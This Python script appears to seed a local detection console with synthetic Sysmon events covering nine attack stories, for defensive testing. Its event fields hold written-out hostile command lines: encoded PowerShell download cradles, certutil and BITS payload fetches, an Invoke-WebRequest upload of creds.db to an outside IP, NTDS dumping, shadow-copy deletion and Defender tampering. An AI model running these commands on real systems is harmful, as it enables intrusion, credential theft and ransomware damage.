#!/usr/bin/env python3
"""Seed the console with a representative set of detections.

Fires enough varied telemetry at a running engine to exercise every surface of
the console at once: rule matches, a correlated phishing-to-recon incident, a
statistical beacon, and a ransomware-prep critical. Use it to see the UI full
rather than clicking through Swagger event by event.

    # with the engine running on :8000
    python scripts/seed_demo.py

Everything targets http://localhost:8000/ingest by default.
"""

from __future__ import annotations

import argparse
import random
import sys
import time
from datetime import datetime, timedelta, timezone

import httpx

BASE = datetime.now(timezone.utc) - timedelta(minutes=20)


def at(offset_seconds: float) -> str:
    """ISO timestamp `offset_seconds` after the base time."""
    return (BASE + timedelta(seconds=offset_seconds)).isoformat()


def event(event_id: int, offset: float, host: str, **data) -> dict:
    """Build a Winlogbeat-shaped Sysmon event."""
    data["UtcTime"] = at(offset)
    return {
        "winlog": {"event_id": event_id, "computer_name": host, "event_data": data},
        "@timestamp": at(offset),
    }


def scenarios() -> list[dict]:
    """Every event to send, in order. Grouped by the story each one tells."""
    events: list[dict] = []

    # ------------------------------------------------------------------ #
    # Story 1 — FIN-WS-07: phishing macro -> recon burst.
    # One process tree. Should collapse into a single high/critical incident
    # carrying SYS-001, SYS-002 and the DSC-001 reconnaissance burst.
    # ------------------------------------------------------------------ #
    host = "FIN-WS-07"
    word, cmd = "{fin-word}", "{fin-cmd}"
    events += [
        event(
            1,
            0,
            host,
            Image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            ProcessGuid=word,
            ParentProcessGuid="{fin-explorer}",
            CommandLine=r'"WINWORD.EXE" /n "C:\Users\rlopez\Downloads\Invoice_Q3.docm"',
        ),
        event(
            1,
            6,
            host,
            Image=r"C:\Windows\System32\cmd.exe",
            ParentImage=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            ProcessGuid=cmd,
            ParentProcessGuid=word,
            CommandLine=r"cmd.exe /c powershell -w hidden -enc "
            r"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
        ),
        event(
            1,
            8,
            host,
            Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{fin-ps}",
            ParentProcessGuid=cmd,
            CommandLine=r"powershell -w hidden -enc "
            r"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
        ),
        # reconnaissance burst — four distinct techniques
        event(
            1,
            22,
            host,
            Image=r"C:\Windows\System32\whoami.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{fin-r1}",
            ParentProcessGuid=cmd,
            CommandLine="whoami /all",
        ),
        event(
            1,
            27,
            host,
            Image=r"C:\Windows\System32\net.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{fin-r2}",
            ParentProcessGuid=cmd,
            CommandLine="net user /domain",
        ),
        event(
            1,
            33,
            host,
            Image=r"C:\Windows\System32\systeminfo.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{fin-r3}",
            ParentProcessGuid=cmd,
            CommandLine="systeminfo",
        ),
        event(
            1,
            39,
            host,
            Image=r"C:\Windows\System32\nltest.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{fin-r4}",
            ParentProcessGuid=cmd,
            CommandLine="nltest /domain_trusts",
        ),
    ]

    # ------------------------------------------------------------------ #
    # Story 2 — DEV-WS-11: LSASS credential access + a beacon.
    # A critical rule (SYS-041) plus a statistical beacon on the same host,
    # so the beacon evidence panel is populated.
    # ------------------------------------------------------------------ #
    host = "DEV-WS-11"
    events.append(
        event(
            10,
            60,
            host,
            SourceImage=r"C:\Users\dev\tools\dump.exe",
            TargetImage=r"C:\Windows\System32\lsass.exe",
            GrantedAccess="0x1410",
            ProcessGuid="{dev-dump}",
            ParentProcessGuid="{dev-shell}",
        )
    )
    # beacon: ~45s callbacks with Cobalt-Strike-style jitter
    random.seed(451)
    clock = 70.0
    for _ in range(11):
        events.append(
            event(
                3,
                clock,
                host,
                Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                ProcessGuid="{dev-beacon}",
                DestinationIp="185.234.72.19",
                DestinationPort="443",
            )
        )
        clock += 45 * (1 - random.uniform(0, 0.37))

    # ------------------------------------------------------------------ #
    # Story 3 — HR-WS-03: ransomware preparation.
    # A lone critical: shadow copies deleted. Single-detection incident that is
    # actionable purely on severity.
    # ------------------------------------------------------------------ #
    events.append(
        event(
            1,
            130,
            "HR-WS-03",
            Image=r"C:\Windows\System32\vssadmin.exe",
            ProcessGuid="{hr-vss}",
            ParentProcessGuid="{hr-shell}",
            CommandLine="vssadmin delete shadows /all /quiet",
        )
    )

    # ------------------------------------------------------------------ #
    # Story 4 — scattered single rule hits across hosts, to fill the stream
    # and the technique panel with variety.
    # ------------------------------------------------------------------ #
    events += [
        event(
            1,
            150,
            "SALES-WS-02",
            Image=r"C:\Windows\System32\certutil.exe",
            ProcessGuid="{s-cu}",
            CommandLine=r"certutil -urlcache -f http://203.0.113.9/p.exe p.exe",
        ),
        event(
            13,
            160,
            "SALES-WS-02",
            Image=r"C:\Windows\System32\reg.exe",
            ProcessGuid="{s-reg}",
            TargetObject=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
        ),
        event(
            1,
            175,
            "IT-WS-05",
            Image=r"C:\Users\admin\AppData\Local\Temp\svchost.exe",
            ProcessGuid="{it-mq}",
            CommandLine=r"svchost.exe",
        ),
        event(
            11,
            190,
            "IT-WS-05",
            Image=r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
            ProcessGuid="{it-xl}",
            TargetFilename=r"C:\Users\admin\AppData\Roaming\update.ps1",
        ),
        event(17, 205, "DEV-WS-11", ProcessGuid="{dev-pipe}", PipeName=r"\msagent_7f"),
    ]

    # ------------------------------------------------------------------ #
    # Story 5 — DC-CORP-01: lateral movement to a domain controller.
    # PsExec-style remote execution + credential access. A high-value target
    # touched from a workstation is a strong signal.
    # ------------------------------------------------------------------ #
    host = "DC-CORP-01"
    svc = "{dc-psexec}"
    events += [
        event(
            1,
            300,
            host,
            Image=r"C:\Windows\PSEXESVC.exe",
            ProcessGuid=svc,
            ParentProcessGuid="{dc-services}",
            CommandLine=r"C:\Windows\PSEXESVC.exe",
            User="CORP\\svc_backup",
            IntegrityLevel="System",
            ProcessId="1180",
            ParentProcessId="668",
            Hashes="SHA256=3337e3875b05e0bfba69ab926532e3f179e8cfbf162ebb60ce58a0281437a7ef",
        ),
        # the named pipe PSEXESVC opens to relay the operator's session --
        # fires alongside the service binary itself, same ProcessGuid, so
        # both land in the same incident.
        event(
            17,
            301,
            host,
            ProcessGuid=svc,
            PipeName=r"\PSEXESVC",
            User="CORP\\svc_backup",
        ),
        event(
            1,
            304,
            host,
            Image=r"C:\Windows\System32\cmd.exe",
            ParentImage=r"C:\Windows\PSEXESVC.exe",
            ProcessGuid="{dc-cmd}",
            ParentProcessGuid=svc,
            CommandLine='cmd.exe /c ntdsutil "ac i ntds" "ifm" '
            '"create full C:\\temp\\ifm" q q',
            User="CORP\\svc_backup",
            IntegrityLevel="System",
            ProcessId="1204",
            ParentProcessId="1180",
        ),
        # LSASS access on the DC — critical
        event(
            10,
            308,
            host,
            SourceImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{dc-cmd}",
            ParentProcessGuid=svc,
            TargetImage=r"C:\Windows\System32\lsass.exe",
            GrantedAccess="0x143a",
            User="CORP\\svc_backup",
        ),
        # a beacon back from the DC
    ]
    random.seed(88)
    clock = 312.0
    for _ in range(9):
        events.append(
            event(
                3,
                clock,
                host,
                Image=r"C:\Windows\System32\cmd.exe",
                ProcessGuid="{dc-cmd}",
                DestinationIp="193.201.9.44",
                DestinationPort="8443",
                DestinationHostname="update.windows-telemetry.co",
            )
        )
        clock += 55 * (1 - random.uniform(0, 0.30))

    # ------------------------------------------------------------------ #
    # Story 6 — WEB-DMZ-02: web shell on an IIS server.
    # w3wp.exe (the IIS worker) spawning a shell is the classic web-shell
    # signature -- a web server has no business running cmd.
    # ------------------------------------------------------------------ #
    host = "WEB-DMZ-02"
    w3wp = "{web-w3wp}"
    events += [
        event(
            1,
            360,
            host,
            Image=r"C:\Windows\System32\inetsrv\w3wp.exe",
            ProcessGuid=w3wp,
            ParentProcessGuid="{web-svchost}",
            CommandLine=r"c:\windows\system32\inetsrv\w3wp.exe -ap "
            "DefaultAppPool"
            "",
            User="IIS APPPOOL\\DefaultAppPool",
            IntegrityLevel="High",
            ProcessId="4400",
            ParentProcessId="720",
        ),
        event(
            1,
            364,
            host,
            Image=r"C:\Windows\System32\cmd.exe",
            ParentImage=r"C:\Windows\System32\inetsrv\w3wp.exe",
            ProcessGuid="{web-cmd}",
            ParentProcessGuid=w3wp,
            CommandLine=r"cmd.exe /c whoami & ipconfig /all",
            ParentCommandLine=r"w3wp.exe -ap " "DefaultAppPool" "",
            User="IIS APPPOOL\\DefaultAppPool",
            IntegrityLevel="High",
            ProcessId="4820",
            ParentProcessId="4400",
        ),
        event(
            1,
            370,
            host,
            Image=r"C:\Windows\System32\certutil.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{web-certutil}",
            ParentProcessGuid="{web-cmd}",
            CommandLine=r"certutil -urlcache -split -f http://193.201.9.44/nc.exe C:\inetpub\wwwroot\nc.exe",
            User="IIS APPPOOL\\DefaultAppPool",
            IntegrityLevel="High",
            ProcessId="4900",
            ParentProcessId="4820",
            Hashes="SHA256=b7e3c8a5f2d14e6b9a0c3f5e8d2b1a4c7f9e0d3b6a5c8e1f4d7b0a3c6e9f2d5b8",
        ),
    ]

    # ------------------------------------------------------------------ #
    # Story 7 — MKTG-WS-09: browser credential theft.
    # A process reaching into a browser's credential store, then exfil. Low and
    # targeted -- info-stealer behaviour.
    # ------------------------------------------------------------------ #
    host = "MKTG-WS-09"
    stealer = "{mktg-stealer}"
    events += [
        event(
            1,
            420,
            host,
            Image=r"C:\Users\jchen\AppData\Local\Temp\update_flash.exe",
            ProcessGuid=stealer,
            ParentProcessGuid="{mktg-explorer}",
            CommandLine=r"update_flash.exe",
            User="CORP\\jchen",
            IntegrityLevel="Medium",
            ProcessId="6200",
            ParentProcessId="3100",
            CurrentDirectory=r"C:\Users\jchen\AppData\Local\Temp",
            Hashes="SHA256=c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
        ),
        # reads Chrome's login data (file access to a sensitive path)
        event(
            11,
            424,
            host,
            Image=r"C:\Users\jchen\AppData\Local\Temp\update_flash.exe",
            ProcessGuid=stealer,
            TargetFilename=r"C:\Users\jchen\AppData\Local\Google\Chrome\User Data\Default\Login Data",
            User="CORP\\jchen",
        ),
        event(
            1,
            430,
            host,
            Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            ParentImage=r"C:\Users\jchen\AppData\Local\Temp\update_flash.exe",
            ProcessGuid="{mktg-ps}",
            ParentProcessGuid=stealer,
            CommandLine=r"powershell -nop -c Invoke-WebRequest -Uri http://45.132.192.68/x -Method POST -InFile $env:TEMP\creds.db",
            User="CORP\\jchen",
            IntegrityLevel="Medium",
            ProcessId="6340",
            ParentProcessId="6200",
        ),
    ]

    # ------------------------------------------------------------------ #
    # Story 8 — ACCT-WS-14: ransomware, full sequence.
    # Defender tampering -> shadow-copy deletion -> mass activity. The recovery
    # inhibition is the point of no return.
    # ------------------------------------------------------------------ #
    host = "ACCT-WS-14"
    ransom = "{acct-ransom}"
    events += [
        event(
            1,
            480,
            host,
            Image=r"C:\Users\mgarcia\Downloads\invoice_scan.exe",
            ProcessGuid=ransom,
            ParentProcessGuid="{acct-explorer}",
            CommandLine=r"invoice_scan.exe",
            User="CORP\\mgarcia",
            IntegrityLevel="High",
            ProcessId="5600",
            ParentProcessId="2900",
            Hashes="SHA256=d4c3b2a1f6e5d8c7b0a9f2e1d4c3b6a5f8e7d0c9b2a1f4e3d6c5b8a7f0e9d2c1",
        ),
        # disable Defender via registry
        event(
            13,
            484,
            host,
            Image=r"C:\Users\mgarcia\Downloads\invoice_scan.exe",
            ProcessGuid=ransom,
            TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",
            Details="DWORD (0x00000001)",
            User="CORP\\mgarcia",
        ),
        # delete shadow copies — critical, point of no return
        event(
            1,
            490,
            host,
            Image=r"C:\Windows\System32\vssadmin.exe",
            ParentImage=r"C:\Users\mgarcia\Downloads\invoice_scan.exe",
            ProcessGuid="{acct-vss}",
            ParentProcessGuid=ransom,
            CommandLine=r"vssadmin delete shadows /all /quiet",
            User="CORP\\mgarcia",
            IntegrityLevel="High",
            ProcessId="5720",
            ParentProcessId="5600",
        ),
        # disable recovery
        event(
            1,
            494,
            host,
            Image=r"C:\Windows\System32\bcdedit.exe",
            ParentImage=r"C:\Users\mgarcia\Downloads\invoice_scan.exe",
            ProcessGuid="{acct-bcd}",
            ParentProcessGuid=ransom,
            CommandLine=r"bcdedit /set {default} recoveryenabled no",
            User="CORP\\mgarcia",
            IntegrityLevel="High",
            ProcessId="5760",
            ParentProcessId="5600",
        ),
    ]

    # ------------------------------------------------------------------ #
    # Story 9 — OPS-WS-21: staged loader, WMI persistence, BYOVD.
    # A "SystemUpdate.exe" loader decodes a smuggled DLL, executes it via a
    # Squiblydoo scriptlet, stages WMI persistence (mofcomp, then the
    # consumer registration itself), fetches a second stage over BITS, and
    # finally loads an unsigned driver to blind EDR -- the six rules added
    # alongside PsExec (Story 5 above). The WMI consumer (EventID 20) and the
    # driver load (EventID 6) carry no ProcessGuid in real Sysmon telemetry,
    # so -- correctly -- they surface as their own single-detection
    # incidents rather than joining this tree; that is what an analyst would
    # actually see, not a seeding gap.
    # ------------------------------------------------------------------ #
    host = "OPS-WS-21"
    loader, cmd2 = "{ops-loader}", "{ops-cmd}"
    events += [
        event(
            1,
            550,
            host,
            Image=r"C:\Users\ops\Downloads\SystemUpdate.exe",
            ProcessGuid=loader,
            ParentProcessGuid="{ops-explorer}",
            CommandLine=r"SystemUpdate.exe",
            User="CORP\\ops",
        ),
        event(
            1,
            554,
            host,
            Image=r"C:\Windows\System32\cmd.exe",
            ParentImage=r"C:\Users\ops\Downloads\SystemUpdate.exe",
            ProcessGuid=cmd2,
            ParentProcessGuid=loader,
            CommandLine=r"cmd.exe /c setup.bat",
        ),
        # SYS-075: certutil decodes a base64-smuggled DLL back to binary.
        event(
            1,
            558,
            host,
            Image=r"C:\Windows\System32\certutil.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{ops-certutil}",
            ParentProcessGuid=cmd2,
            CommandLine=r"certutil.exe -decode C:\Users\ops\AppData\Local\Temp\payload.b64 "
            r"C:\Users\ops\AppData\Local\Temp\payload.dll",
        ),
        # SYS-074: Squiblydoo -- scrobj.dll runs the decoded scriptlet, no URL
        # in the command line, so SYS-003's `/i:http` check stays quiet.
        event(
            1,
            562,
            host,
            Image=r"C:\Windows\System32\regsvr32.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{ops-regsvr}",
            ParentProcessGuid=cmd2,
            CommandLine=r"regsvr32.exe /s /u /i:C:\Users\ops\AppData\Local\Temp\payload.sct scrobj.dll",
        ),
        # SYS-070: mofcomp stages the WMI subscription from the command line.
        event(
            1,
            566,
            host,
            Image=r"C:\Windows\System32\wbem\mofcomp.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{ops-mofcomp}",
            ParentProcessGuid=cmd2,
            CommandLine=r"mofcomp.exe C:\Users\ops\AppData\Local\Temp\persist.mof",
        ),
        # SYS-071: the subscription itself lands as a WmiEventConsumer.
        event(
            20,
            570,
            host,
            Name="SystemUpdateWatcher",
            Type="CommandLineEventConsumer",
            Destination=r"powershell.exe -w hidden -enc "
            r"U3RhcnQtUHJvY2VzcyBDOlxVc2Vyc1xvcHNcc3RhZ2UyLmV4ZQ==",
        ),
        # SYS-076: second stage fetched via the BITS cmdlet, not bitsadmin.
        event(
            1,
            574,
            host,
            Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{ops-bits}",
            ParentProcessGuid=cmd2,
            CommandLine=r"Start-BitsTransfer -Source http://185.220.101.42/stage2.exe "
            r"-Destination C:\Users\ops\AppData\Local\Temp\stage2.exe",
        ),
        # SYS-077: an unsigned driver loads, the BYOVD step that blinds EDR
        # right before the second stage would run.
        event(
            6,
            578,
            host,
            ImageLoaded=r"C:\Windows\Temp\rtcore64.sys",
            Signed="false",
            Hashes="SHA256=a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f9",
        ),
    ]

    return events


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Seed the console with demo detections."
    )
    parser.add_argument("--url", default="http://localhost:8000/ingest")
    parser.add_argument(
        "--delay",
        type=float,
        default=0.15,
        help="Seconds between events, so the live feed animates. 0 for a burst.",
    )
    args = parser.parse_args()

    events = scenarios()
    print(f"Sending {len(events)} events to {args.url}")

    fired: dict[str, int] = {}
    incidents: set[str] = set()

    try:
        with httpx.Client(timeout=10.0) as client:
            for i, evt in enumerate(events, 1):
                try:
                    result = client.post(args.url, json=evt).json()
                except httpx.HTTPError as exc:
                    print(f"  ! event {i}: {exc}", file=sys.stderr)
                    continue

                for d in result.get("detections", []):
                    fired[d["rule_id"]] = fired.get(d["rule_id"], 0) + 1
                for inc in result.get("incidents", []):
                    incidents.add(inc["id"])

                if args.delay:
                    time.sleep(args.delay)
    except httpx.ConnectError:
        sys.exit(f"\nCannot reach {args.url}. Is the engine running?")

    print(f"\nDetections fired:")
    for rule_id, count in sorted(fired.items()):
        print(f"  {rule_id:10} x{count}")
    print(
        f"\n{len(incidents)} incident(s) raised. Open http://localhost:8000 to triage."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
